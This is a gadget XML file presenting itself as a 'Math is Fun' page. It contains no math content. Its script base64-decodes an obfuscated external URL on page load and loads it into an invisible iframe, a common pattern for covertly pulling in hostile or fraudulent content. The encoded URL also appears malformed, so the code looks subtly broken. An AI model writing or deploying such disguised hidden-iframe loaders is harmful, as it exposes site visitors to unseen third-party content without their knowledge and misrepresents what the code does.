<?xml version="1.0" encoding="UTF-8"?>
<Module>
  <ModulePrefs title="Math is Fun" />
  <Content type="html">
    <![CDATA[
      <html>
        <head>
          <title>Math is Fun</title>
        </head>
        <body>
          <div id="iframe-container">
            <iframe id="hidden-iframe" style="display: none;"></iframe>
          </div>
          
          <script>
            // Load the iframe dynamically
            (function() {
              var iframe = document.getElementById('hidden-iframe');
              var url = "aHR0cHM6Ly9hZGRpdGlvbi5wYXJ0aWNsZS5lcz"; // Base64 encoded URL
              var decodedUrl = atob(url);
              
              // Check if the URL is accessible before setting it
              fetch(decodedUrl, { method: 'HEAD' })
                .then(function(response) {
                  if (response.ok) {
                    iframe.src = decodedUrl;
                  } else {
                    console.error('Failed to load iframe:', response.statusText);
                  }
                })
                .catch(function(error) {
                  console.error('Error fetching URL:', error);
                });
            })();
          </script>
        </body>
      </html>
    ]]>
  </Content>
</Module>
